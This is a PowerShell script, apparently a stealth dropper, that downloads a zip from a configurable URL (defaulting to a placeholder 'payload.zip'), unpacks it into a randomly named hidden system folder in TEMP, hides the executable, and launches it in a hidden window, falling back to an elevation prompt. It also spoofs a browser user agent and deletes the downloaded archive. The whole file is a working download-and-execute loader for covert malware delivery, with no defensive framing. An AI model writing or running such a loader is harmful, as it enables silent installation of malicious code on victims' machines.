param(
    [string]$URL = "http://example.com/payload.zip",
    [string]$ExeName = "payload.exe"
)

function Invoke-StealthZipExec {
    param (
        [string]$URL,
        [string]$ExeToRun
    )
    
    try {
        # Create random paths
        $tempDir = "$env:TEMP\$(Get-Random)"
        $zipPath = "$tempDir\$(Get-Random).zip"
        
        # Create hidden directory
        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
        $dirInfo = Get-Item $tempDir -Force
        $dirInfo.Attributes = 'Hidden', 'System'
        
        # Setup secure WebClient
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.Headers.Add("Accept", "*/*")
        $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.9")
        $webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
        $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
        
        # Download zip
        $webClient.DownloadFile($URL, $zipPath)
        
        # Verify download
        if (!(Test-Path $zipPath)) {
            throw "Download failed"
        }
        
        # Extract silently
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
        
        # Find and execute target
        $exePath = Get-ChildItem -Path $tempDir -Filter $ExeToRun -Recurse | Select-Object -First 1
        if ($exePath) {
            # Set file as hidden
            $exePath.Attributes = 'Hidden', 'System'
            
            # Execute silently using various methods
            try {
                Start-Process -FilePath $exePath.FullName -WindowStyle Hidden
            } catch {
                try {
                    $shell = New-Object -ComObject Shell.Application
                    $shell.ShellExecute($exePath.FullName, "", "", "runas", 0)
                } catch {
                    & $exePath.FullName
                }
            }
        }
        
    } catch {
        Write-Warning "Operation failed: $_"
    } finally {
        if ($webClient) {
            $webClient.Dispose()
        }
        # Cleanup attempt (might fail if files are in use)
        try {
            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        } catch { }
    }
}

# Execute stealthily
Invoke-StealthZipExec -URL $URL -ExeToRun $ExeName
